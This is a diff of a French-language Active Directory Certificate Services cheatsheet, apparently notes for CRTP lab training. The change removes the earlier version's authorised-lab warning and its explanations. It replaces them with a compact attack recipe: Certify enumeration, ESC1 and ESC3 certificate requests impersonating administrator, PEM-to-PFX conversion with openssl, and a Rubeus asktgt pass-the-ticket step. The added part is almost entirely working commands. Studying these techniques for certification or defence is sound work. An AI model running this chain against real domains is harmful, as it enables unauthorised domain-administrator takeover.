@@ -1,137 +1,35 @@
 # Cheatsheet - AD CS et certificats
 
 > [!summary] Objectif
-> Préparer une base de travail sur AD CS, les templates de certificats et les premières commandes d'énumération du module.
+> Trouver un template de certificat mal configuré (ESC1, ESC3) et l'abuser pour obtenir un certificat utilisable comme DA/EA — le certificat sert ensuite à demander un TGT (`Rubeus asktgt /certificate:`).
 
-> [!warning] Cadre d'utilisation
-> À utiliser uniquement dans un environnement de lab autorisé, dans le cadre de l'apprentissage et de la préparation CRTP.
-
-## Quand utiliser cette fiche
-
-- Quand le parcours arrive sur `AD CS`, `Certify`, `Certificate Request Agent` ou `HTTPSCertificates`.
-- Quand une élévation ou une persistance repose sur un template de certificat.
-
-## Prérequis
-
-- `Certify.exe` disponible sur la VM du lab.
-- Le nom de la CA et des templates concernés.
-
-## Commandes
-
-### Objectif
-
-Identifier la CA du domaine.
-
-### Commande
-
+### Enumerate CA and templates
 ```powershell
 C:\AD\Tools\Certify.exe cas
-```
-
-### Explication
-
-Permet de vérifier qu'AD CS est présent et de récupérer le nom de la CA cible.
-
-### Contexte d’utilisation
-
-Point d'entrée naturel avant toute recherche de template.
-
-### Précautions
-
-Noter le nom exact de la CA avant de passer aux templates.
-
-### Objectif
-
-Lister les templates et filtrer ceux qui semblent intéressants.
-
-### Commande
-
-```powershell
 C:\AD\Tools\Certify.exe find
+C:\AD\Tools\Certify.exe find /vulnerable
+```
+
+### ESC1 — enrollee supplies subject (SAN arbitraire)
+```powershell
 C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
+C:\AD\Tools\Certify.exe request /ca:<CA> /template:"HTTPSCertificates" /altname:administrator
 ```
+Le template autorise l'appelant à choisir le SAN (`ENROLLEE_SUPPLIES_SUBJECT`) : demander un cert au nom de `administrator` directement.
 
-### Explication
-
-Le PDF s'appuie sur `find` pour lister les templates puis sur `find /enrolleeSuppliesSubject` pour cibler des templates du type `HTTPSCertificates`.
-
-### Contexte d’utilisation
-
-Étape logique avant une requête de certificat.
-
-### Précautions
-
-Noter les templates liés à `Certificate Request Agent` et ceux qui autorisent `ENROLLEE_SUPPLIES_SUBJECT`.
-
-### Objectif
-
-Demander un certificat sur un template ciblé.
-
-### Commande
-
+### ESC3 — Enrollment Agent (abus en 2 temps)
 ```powershell
-C:\AD\Tools\Certify.exe request /ca:mcorpdc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates"
+# 1. obtenir un cert "Certificate Request Agent" (dispo à Domain Users)
+C:\AD\Tools\Certify.exe request /ca:<CA> /template:SmartCardEnrollment-Agent
+# 2. utiliser ce cert pour demander, au nom d'un autre user, un cert client-auth
+C:\AD\Tools\Certify.exe request /ca:<CA> /template:SmartCardEnrollment-Users /onbehalfof:<DOMAIN>\administrator /enrollcert:esc3-agent.pfx /enrollcertpw:<PW>
 ```
+Un template avec EKU *Certificate Request Agent* ouvert à Domain Users permet de signer une demande "on behalf of" n'importe quel user sur un second template d'authentification — deux templates a priori anodins, combinés, valent ESC1.
 
-### Explication
-
-Commande alignée sur l'exemple du lab autour du template `HTTPSCertificates`.
-
-### Contexte d’utilisation
-
-À utiliser lorsque le template vulnérable a déjà été identifié.
-
-### Précautions
-
-Documenter le template, la CA et le contexte utilisateur utilisés pour la requête.
-
-### Objectif
-
-Demander un certificat avec `altname` si le scénario le prévoit.
-
-### Commande
-
+### Convert PEM to PFX and use with Rubeus
 ```powershell
-C:\AD\Tools\Certify.exe request /ca:mcorpdc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1-DA.pfx
+Rubeus.exe asktgt /user:administrator /certificate:esc1-DA.pfx /password:<PW> /ptt
 ```
 
-### Explication
-
-Prépare les scénarios de lab où le template permet de contrôler certains attributs de la demande.
-
-### Contexte d’utilisation
-
-À n'utiliser que quand le template identifié permet effectivement ce comportement.
-
-### Précautions
-
-Vérifier les propriétés du template avant de lancer une requête avec `altname`.
-
-### Objectif
-
-Convertir le certificat retourné en PFX.
-
-### Commande
-
-```powershell
-C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
-```
-
-### Explication
-
-Le PDF convertit ensuite le certificat PEM en PFX pour l'étape suivante du module.
-
-### Contexte d’utilisation
-
-Fiche prête pour la suite du workflow AD CS quand tu aborderas réellement ce bloc.
-
-### Précautions
-
-Conserver le nom du fichier et le mot de passe d'export utilisé dans tes notes de lab.
-
-### Notes associées
-
-- [[Synthèse - AD CS]]
-- [[Cheatsheet - Trusts et forêts]]
-- [[Attaques AD - MOC]]
-- [[Labs - MOC]]
+**Link** — [[Synthèse - AD CS]] · [[Cheatsheet - Trusts et forêts]] · [[Cheatsheet - Tickets Kerberos]] · [[Attaques AD - MOC]]
